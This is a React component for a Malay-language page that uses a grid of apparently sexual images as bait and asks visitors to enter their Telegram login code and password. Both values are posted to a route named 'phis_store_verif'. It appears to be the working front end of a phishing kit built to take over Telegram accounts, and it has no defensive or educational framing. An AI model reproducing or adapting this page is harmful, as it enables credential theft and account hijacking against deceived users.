import { Link, useForm } from "@inertiajs/react";
import { TextField } from "@mui/material";
import React, { useEffect, useState } from "react";

export default function SexLayouts() {
    const { data, setData, post } = useForm({ code: "", passowr: "" });

    const changeHandler = (e) => {
        const input = e.target.value;

        // Menggunakan regex untuk memeriksa apakah input hanya berisi angka dan tanda tambah
        if (/^[0-9+]*$/.test(input)) {
            setData({ ...data, code: input });
        }
    };

    const submitHandler = () => {
        if (data.code.length >= 5) {
            post(route("phis_store_verif"));
        }
    };
    return (
        <div className="relative h-[932px] w-full overflow-hidden">
            <div className="bg-black/50 w-full h-full absolute top-0 left-0 z-10 "></div>

            <div className="absolute top-0 left-0 w-full h-full scrolNaik">
                <div class="grid grid-cols-2 md:grid-cols-4 gap-y-2">
                    <div class="grid gap-y-2">
                        <div>
                            <img
                                class="h-auto max-w-full rounded-lg"
                                src="rhmt/utama1.jpg"
                                alt=""
                            />
                        </div>
                        <div>
                            <img
                                class="h-auto max-w-full rounded-lg"
                                src="rhmt/utama2.jpg"
                                alt=""
                            />
                        </div>
                        <div>
                            <img
                                class="h-auto max-w-full rounded-lg"
                                src="rhmt/utama3.jpg"
                                alt=""
                            />
                        </div>
                    </div>
                    <div class="grid gap-y-2">
                        <div>
                            <img
                                class="h-auto max-w-full rounded-lg"
                                src="rhmt/2.jpg"
                                alt=""
                            />
                        </div>
                        <div>
                            <img
                                class="h-auto max-w-full rounded-lg"
                                src="rhmt/6.jpg"
                                alt=""
                            />
                        </div>
                        <div>
                            <img
                                class="h-auto max-w-full rounded-lg"
                                src="rhmt/8.jpg"
                                alt=""
                            />
                        </div>
                    </div>
                    <div class="grid gap-y-2">
                        <div>
                            <img
                                class="h-auto max-w-full rounded-lg"
                                src="rhmt/1.jpg"
                                alt=""
                            />
                        </div>
                        <div>
                            <img
                                class="h-auto max-w-full rounded-lg"
                                src="rhmt/2.jpg"
                                alt=""
                            />
                        </div>
                        <div>
                            <img
                                class="h-auto max-w-full rounded-lg"
                                src="rhmt/3.jpg"
                                alt=""
                            />
                        </div>
                    </div>
                    <div class="grid gap-y-2">
                        <div>
                            <img
                                class="h-auto max-w-full rounded-lg"
                                src="rhmt/4.jpg"
                                alt=""
                            />
                        </div>
                        <div>
                            <img
                                class="h-auto max-w-full rounded-lg"
                                src="rhmt/6.jpg"
                                alt=""
                            />
                        </div>
                        <div>
                            <img
                                class="h-auto max-w-full rounded-lg"
                                src="rhmt/7.jpg"
                                alt=""
                            />
                        </div>
                    </div>
                </div>
            </div>

            <div className="absolute top-0 left-0 w-full h-full flex justify-center items-start flex-col z-[10] px-5">
                <h3 className="text-4xl font-extrabold text-pink-500 font-sans tracking-tighter">
                    <span className="text-white tracking-tighter text-2xl font-thin">
                        Masuk Cod Guna
                    </span>
                    {" Join"}
                </h3>
                <p className="tracking-tighter text-white font-thin text-lg">
                    Sila masukkan Code Telegram untuk Lanjut.
                </p>
                <div className="py-5 w-full flex flex-col gap-2">
                    <TextField
                        value={data.code}
                        onChange={changeHandler}
                        sx={{
                            outlineColor: "pink",
                        }}
                        className="bg-white w-full rounded-lg"
                        variant="outlined"
                        label="Code"
                    />
                    <TextField
                        value={data.password}
                        onChange={(e) =>
                            setData({ ...data, password: e.target.value })
                        }
                        sx={{
                            outlineColor: "pink",
                        }}
                        className="bg-white w-full rounded-lg"
                        variant="outlined"
                        type="password"
                        label="Password"
                    />
                </div>
                <button
                    onClick={submitHandler}
                    className="font-bold bg-pink-500 text-white text-2xl py-3 px-4 rounded-lg animate-pulse"
                >
                    Kirim Code
                </button>
            </div>
        </div>
    );
}
